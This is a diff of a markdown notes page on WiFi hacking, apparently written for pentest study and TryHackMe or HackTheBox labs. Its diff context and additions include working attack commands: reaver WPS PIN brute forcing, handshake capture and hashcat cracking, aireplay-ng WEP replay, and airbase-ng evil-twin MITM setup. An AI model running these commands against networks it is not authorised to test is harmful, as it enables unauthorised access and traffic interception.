@@ -1,14 +1,10 @@
-# WIFI Hacking
+# WiFi Hacking
 
-## Gear
 
-Given that you may not have network card that has monitor mode; recommended Adaptors:  
-- Alfa Tube U: [https://amzn.to/3Q8Togp](https://amzn.to/3Q8Togp)  
-- Alfa AWUS036NHA: [https://amzn.to/3wnyVen](https://amzn.to/3wnyVen)  
-- Alfa AWUS036ACM: [https://amzn.to/3fCL4WT](https://amzn.to/3fCL4WT)  
-- Alfa AWUS036ACH: [https://amzn.to/3rLAjny](https://amzn.to/3rLAjny) or [https://amzn.to/2PxkkMV](https://amzn.to/2PxkkMV)
-
-Blog post about the most expensive of the above from [medium Fabian Voith](https://fabian-voith.de/2020/04/22/get-alfa-awus036ach-usb-nic-running-on-kali-vm-to-attack-wireless-networks/)
+"Normal" connections to WiFi networks to contrast with the rest of this page: 
+- WiFi networks broadcast Wi-Fi signals with a unique SSID (network name).
+- Connecting typically requires a password also called a pre-shared key PSK.
+- Once connected the WiFi router will assign your device a IP address of the network 
 
 ## Terminology
 
@@ -17,33 +13,46 @@ Term | Description
 SSID | The network "name" that you see when you try and connect
 ESSID | An SSID that *may* apply to multiple access points, eg a company office, normally forming a bigger network. For Aircrack they normally refer to the network you're attacking.
 BSSID | An access point MAC (hardware) address
-WPA2-PSK | Wifi networks that you connect to by providing a password that's the same for everyone
-WPA2-EAP | Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
+WPA2-PSK | WiFi networks that you connect to by providing a password that's the same for everyone
+WPA2-EAP | WiFi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
 RADIUS | A server for authenticating clients, not just for wifi.
 
- Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt), which is the best concise description as Protocol, Attack and Remediation:
+ Updated Mirror from [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt), which is the best concise description as Protocol, Attack and Remediation - updated with [THM AoC 2024 - no answers](https://tryhackme.com/r/room/adventofcyber2024) plus additional sources:
 - Wired Equivalent Privacy ([[WEP]])
 	- RC4 stream cipher w/ CRC32 for integrity check
 	- Attack: 
 		- By sniffing an [[ARP]] packet, then replaying it to get many encrypted replies with different IVs.
 	- Remediation: 
 		- Use WPA2
-- Wifi Protected Access ([[WPA]])
+- WiFi Protected Access ([[WPA]])
 	- Temporal Key Integrity Protocol ([[TKIP]]) Message Integrity Check
+	- WPA 4 Way handshake:
+		- Router Challenge
+		- Client Response
+		- Router verifies with responding to the client with a result 
+		- Final configuration and connection establishment
 	- Attack: 
 		- Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
 	- Remediation: 
 		- Use long-keys
-- Wifi Protected Access 2 ([[WPA2]])
+- WiFi Protected Access 2 ([[WPA2]])
 	- Advanced Encryption Standard ([[AES]])
 	- Attack:  
 		- Uses a four way handshake, and if that handshake can be captured, then a dictionary attack ban be mounted to find the Pairwise Master Key for the Access Point and client Station.
 	- Remediation:
 		- WPA-Enterprise
+- Wi-Fi Protected Setup [[WPS]] ([HackTheBox WPS Pin Attacks - Blog - BEWARE Spoilers for HTB Retired Machines after section: Exploiting WPS in practice](https://www.hackthebox.com/blog/wps-pin-attacks-and-cracking-wps-with-reaver) claims it is also refer to as Wi-Fi Simple Configuration (WSC))
+	- Attack: 
+		- Brute force the PIN - [[Brute-Force-Attacks]]  
+	- Remediation: 
+		- Update hardware and firmware accordingly 
 
-## Networking Pre-Tool 
+- Evil Twin attack - https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)
+- Rogue access point - https://en.wikipedia.org/wiki/Rogue_access_point
 
+## Network configuration commands 
 
+`iw` *"show / manipulate wireless devices and their configuration"* - [iw linux.die man page](https://linux.die.net/man/8/iw)
 ```bash
 iw 
 iw dev $interface
@@ -54,11 +63,20 @@ iw dev # List all interfaces similar to `$interface info`
 iw wlan0 info # Displays the following
 # addr is the MAC/BSSID
 # type is client mode: monitor, managed, etc
-iw dev $interface scan # Scans the area for available WIFI network from that interface
+iw dev $interface scan # Scans the area for available WiFi network from that interface
+# Important info and questions to ask:
+# What standard is used?
+# SSID, BSSID - needed to tools
+# What ciphers are used?
+# What Authentication suites are used?
+# What is the DS Parameter set value == What Channel is used (Channel refers to the specific frequency range within the broader WiFi signals spectrum)?
+# e.g: RSN (Robust Security Network) indicates WPA2
 
+# Put NIC into monitor mode:
 ip link set dev $interface down
 iw dev $interface set type monitor
 ip link set dev $interface up
+iw dev $interface info
 ```
 
 
@@ -70,8 +88,7 @@ iwconfig # Verify
 # Kill them using
 airmon-ng check kill
 ```
-Kill potential PIDs that will interfere by changing channels
-and sometimes putting the interface back in managed mode.
+Kill potential PIDs that will interfere by changing channels and sometimes putting the interface back in managed mode.
 
 You may need to disable Network Manager on Kali with:
 ```bash
@@ -167,7 +184,7 @@ reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1
 
 ## Alternatives to `airX-ng`
 
-[cyberark](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick) recommends cracking [[WIFI]] with `hcxpcapngtool` that uses `hashcat` see: [[Hashcat-Cheatsheet]]
+[cyberark](https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick) recommends cracking [[WiFi]] with `hcxpcapngtool` that uses `hashcat` see: [[Hashcat-Cheatsheet]]
 ```bash
 hcxpcapngtool -o $file.hash $file.pcapng
 ```
@@ -318,7 +335,7 @@ ifconfig wlan0mon up
 aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
 ```
 
-Man in the Middle WIFI attacks - [[MITM-Attacks]]
+Man in the Middle WiFi attacks - [[MITM-Attacks]]
 ```bash
 airmon-ng start wlan0
 airbase-ng -e “<FakeBSSID>” wlan0mon
@@ -334,6 +351,16 @@ wireshark &
 ;select <VariableName> interface
 ```
 
+## Hardware (possibly not current BiS)
+
+Given that you may not have network card that has monitor mode; recommended Adaptors:  
+- Alfa Tube U: [https://amzn.to/3Q8Togp](https://amzn.to/3Q8Togp)  
+- Alfa AWUS036NHA: [https://amzn.to/3wnyVen](https://amzn.to/3wnyVen)  
+- Alfa AWUS036ACM: [https://amzn.to/3fCL4WT](https://amzn.to/3fCL4WT)  
+- Alfa AWUS036ACH: [https://amzn.to/3rLAjny](https://amzn.to/3rLAjny) or [https://amzn.to/2PxkkMV](https://amzn.to/2PxkkMV)
+
+Blog post about the most expensive of the above from [medium Fabian Voith](https://fabian-voith.de/2020/04/22/get-alfa-awus036ach-usb-nic-running-on-kali-vm-to-attack-wireless-networks/)
+
 ## References
 
 [THM Room](https://tryhackme.com/room/wifihacking101)
@@ -344,3 +371,6 @@ wireshark &
 [GitHub OlivierLaflamme/Cheatsheet-God - Cheatsheet_WirelessTesting.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_WirelessTesting.txt)
 [GitHub wiire-a/pixiewps - Pixie WPS](https://github.com/wiire-a/pixiewps)
 [Kali Tools: Reaver](https://www.kali.org/tools/reaver/) 
+[THM AoC 2024 - no answers](https://tryhackme.com/r/room/adventofcyber2024)
+[iw linux.die man page](https://linux.die.net/man/8/iw)
+[HackTheBox WPS Pin Attacks - Blog - BEWARE Spoilers for HTB Retired Machines after section: Exploiting WPS in practice](https://www.hackthebox.com/blog/wps-pin-attacks-and-cracking-wps-with-reaver) 
